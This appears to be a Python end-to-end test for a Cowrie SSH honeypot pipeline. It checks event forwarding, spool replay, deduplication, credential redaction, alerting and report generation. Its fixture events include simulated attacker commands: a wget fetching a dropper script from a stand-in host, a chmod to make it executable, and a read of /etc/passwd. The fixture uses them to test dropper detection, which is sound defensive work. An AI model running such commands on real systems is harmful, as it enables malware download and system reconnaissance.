from __future__ import annotations

import asyncio
import base64
import json
import os
import sys
import tempfile
import threading
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from production.workers.analysis_worker import AnalysisWorker
from production.utils.config import ProductionConfig
from production.api.ingest_api import build_server
from production.workers.sensor_forwarder import forward_once, post_events
from production.workers.session_worker import SessionWorker
from production.storage import open_storage
from production.reporting.session_assessment_v4 import (
    build_session_assessment_v4,
    validate_session_assessment_v4,
)


def _config(tmp: str) -> ProductionConfig:
    root = Path(tmp)
    keyring_path = root / "credential-hmac-keyring.json"
    keyring_path.write_text(
        json.dumps(
            {
                "schema_version": "credential_hmac_keyring.v1",
                "active_key_id": "e2e-test-key",
                "keys": {
                    "e2e-test-key": base64.b64encode(b"e2e-test-key-material-32-bytes!!").decode(
                        "ascii"
                    )
                },
                "correlation_key_ids": [],
            },
            sort_keys=True,
        ),
        encoding="utf-8",
    )
    os.chmod(keyring_path, 0o600)
    return ProductionConfig(
        sensor_id="pi5-test-sensor",
        api_token="dev-token",
        database_url=f"sqlite:///{root / 'production_e2e.db'}",
        ingest_host="127.0.0.1",
        ingest_port=0,
        cowrie_log_path=str(root / "cowrie.json"),
        spool_path=str(root / "sensor_spool.ndjson"),
        forwarder_batch_size=100,
        forwarder_timeout_seconds=1,
        worker_batch_size=100,
        analysis_batch_size=10,
        analysis_max_attempts=1,
        reports_dir=str(root / "reports"),
        enable_feed_loading=False,
        enable_securebert=False,
        enable_actor_attribution=False,
        webhook_url="",
        credential_hmac_keyring_file=str(keyring_path),
    )


def _events() -> list[dict]:
    session = "e2e-session-1"
    src_ip = "203.0.113.77"

    def base(index: int, eventid: str) -> dict:
        return {
            "eventid": eventid,
            "session": session,
            "src_ip": src_ip,
            "timestamp": f"2026-05-12T00:00:{index:02d}Z",
            "sensor": "pi5-test-sensor",
            "src_port": 43210,
            "dst_ip": "198.51.100.10",
            "dst_port": 22,
            "protocol": "ssh",
        }

    events = [
        {**base(0, "cowrie.client.version"), "version": "SSH-2.0-libssh"},
        {**base(1, "cowrie.client.kex"), "hassh": "hassh-test-value"},
    ]
    for i in range(5):
        events.append(
            {
                **base(i + 2, "cowrie.login.failed"),
                "username": "root",
                "password": f"bad-password-{i}",
            }
        )
    events.extend(
        [
            {**base(7, "cowrie.login.success"), "username": "root", "password": "real-secret"},
            {**base(8, "cowrie.command.input"), "input": "whoami", "success": 1},
            {
                **base(9, "cowrie.command.input"),
                "input": "wget -q http://evil.example.com/dropper.sh -O /tmp/dropper",
                "success": 1,
            },
            {**base(10, "cowrie.command.input"), "input": "chmod +x /tmp/dropper", "success": 1},
            {**base(11, "cowrie.command.input"), "input": "cat /etc/passwd", "success": 1},
            {**base(12, "cowrie.session.closed"), "duration": 37.5},
        ]
    )
    return events


def _write_cowrie_log(path: str, events: list[dict]) -> None:
    Path(path).write_text(
        "\n".join(json.dumps(event, sort_keys=True) for event in events) + "\n",
        encoding="utf-8",
    )


class FakeCoordinator:
    def __init__(self, base_url: str = "", model: str = "", max_tokens: int = 0) -> None:
        self.max_tokens = max_tokens

    async def analyze(self, ioc_bundle, tactic_summary, sessions_obj, **kwargs):
        return build_session_assessment_v4(
            sessions_obj,
            raw_events=kwargs.get("raw_events", []),
        )


def test_forwarder_spool_replay_to_analysis_report() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        events = _events()
        _write_cowrie_log(cfg.cowrie_log_path, events)

        cfg.ingest_url = "http://127.0.0.1:9/events"
        outage = forward_once(cfg)
        assert outage.sent == 0
        assert outage.remaining == len(events)
        assert outage.error
        assert Path(cfg.spool_path).exists()

        storage = open_storage(cfg.database_url)
        server = build_server(cfg)
        port = server.server_address[1]
        cfg.ingest_url = f"http://127.0.0.1:{port}/events"
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            replay = forward_once(cfg)
            assert replay.sent == len(events)
            assert replay.remaining == 0
            assert not Path(cfg.spool_path).exists()

            duplicate_response = post_events(cfg, events)
            assert duplicate_response["accepted"] == 0
            assert duplicate_response["duplicates"] == len(events)

            Path(f"{cfg.spool_path}.offset").write_text("0", encoding="utf-8")
            duplicate_replay = forward_once(cfg)
            assert duplicate_replay.sent == 0
            assert duplicate_replay.duplicates == len(events)
            assert duplicate_replay.rejected == 0
            assert duplicate_replay.remaining == 0
            assert not Path(cfg.spool_path).exists()
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)

        stored_events = storage.list_rows("events", limit=100)
        assert len(stored_events) == len(events)
        serialized_events = json.dumps(stored_events)
        assert "1234" not in serialized_events
        login_events = [
            json.loads(row["payload_json"])
            for row in stored_events
            if row["eventid"].startswith("cowrie.login.")
        ]
        assert login_events
        assert all(
            event.get("username") == "[REDACTED]"
            and event.get("password") == "[REDACTED]"
            for event in login_events
        )

        processed = SessionWorker(cfg).process_unprocessed()
        assert processed == len(events)
        prediction_outbox = storage.list_rows("prediction_outbox")
        prediction_snapshots = storage.list_rows("prediction_snapshots")
        assert prediction_outbox
        assert len(prediction_outbox) == len(prediction_snapshots)
        assert all(row["status"] == "completed" for row in prediction_outbox)
        assert all(row["snapshot_id"] for row in prediction_outbox)

        sessions = storage.list_rows("sessions")
        assert len(sessions) == 1
        session_payload = json.loads(sessions[0]["payload_json"])
        serialized_session = json.dumps(session_payload)
        assert session_payload["is_ended"] is True
        assert session_payload["login_password"] == "[REDACTED]"
        assert session_payload["login_password_hash"] == ""
        assert session_payload["credential_metadata"]["credential_observed"] is True
        assert session_payload["credential_metadata"]["raw_password_stored"] is False
        assert "real-secret" not in serialized_session
        assert session_payload["hassh"] == "hassh-test-value"
        assert session_payload["client_version"] == "SSH-2.0-libssh"
        assert session_payload["ioc_summary"]["total"] >= 1
        assert session_payload["bpg_list"]

        alerts = storage.list_rows("alerts")
        assert any(alert["severity"] == "MEDIUM" and "Brute force" in alert["reason"] for alert in alerts)
        assert any(alert["severity"] == "HIGH" and "Dropper pattern" in alert["reason"] for alert in alerts)

        jobs = storage.list_rows("analysis_jobs")
        assert len(jobs) == 1
        assert jobs[0]["status"] == "queued"

        analyzed = asyncio.run(AnalysisWorker(cfg).process_once(coordinator_class=FakeCoordinator))
        assert analyzed == 1

        reports = storage.list_rows("reports")
        assert len(reports) == 1
        report = json.loads(reports[0]["payload_json"])
        assert report["session_id"] == "e2e-session-1"
        assert report["schema_version"] == "session_assessment.v4"
        assert validate_session_assessment_v4(report) == []
        assert report["canonical_evidence"]["source_evidence_sha256"]
        assert report["authority"]["predictions_authoritative"] is False
        assert report["authority"]["automatic_response_authorized"] is False
        assert report["artifacts"]["json"]
        assert report["artifacts"]["stix"]
        rendered_report = (
            report["artifacts"].get("pdf")
            or report["artifacts"].get("pdf_fallback_markdown")
        )
        assert rendered_report
        for artifact_path in report["artifacts"].values():
            assert Path(artifact_path).exists()

        jobs = storage.list_rows("analysis_jobs")
        assert jobs[0]["status"] == "succeeded"
        refreshed_session = json.loads(storage.list_rows("sessions")[0]["payload_json"])
        assert refreshed_session["analysis_status"] == "succeeded"
        assert refreshed_session["report_id"] == jobs[0]["report_id"]
        assert refreshed_session["analysis_updated_at"]


def test_forwarder_removes_acknowledged_events_and_retains_only_rejected_events() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        valid = {
            "eventid": "cowrie.session.connect",
            "session": "mixed-ack-session",
            "src_ip": "203.0.113.88",
            "timestamp": "2026-07-13T15:00:00Z",
        }
        invalid = {
            "eventid": "",
            "session": "mixed-ack-session",
            "src_ip": "203.0.113.88",
            "timestamp": "2026-07-13T15:00:01Z",
        }
        _write_cowrie_log(cfg.cowrie_log_path, [valid, invalid])

        server = build_server(cfg)
        cfg.ingest_url = f"http://127.0.0.1:{server.server_address[1]}/events"
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            result = forward_once(cfg)
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)

        assert result.sent == 1
        assert result.duplicates == 0
        assert result.rejected == 1
        assert result.remaining == 1
        assert "rejected by ingest" in result.error

        retained = [
            json.loads(line)
            for line in Path(cfg.spool_path).read_text(encoding="utf-8").splitlines()
        ]
        assert retained == [invalid]
        assert len(open_storage(cfg.database_url).list_rows("events", limit=10)) == 1


if __name__ == "__main__":
    test_forwarder_spool_replay_to_analysis_report()
    test_forwarder_removes_acknowledged_events_and_retains_only_rejected_events()
    print("production e2e tests passed")
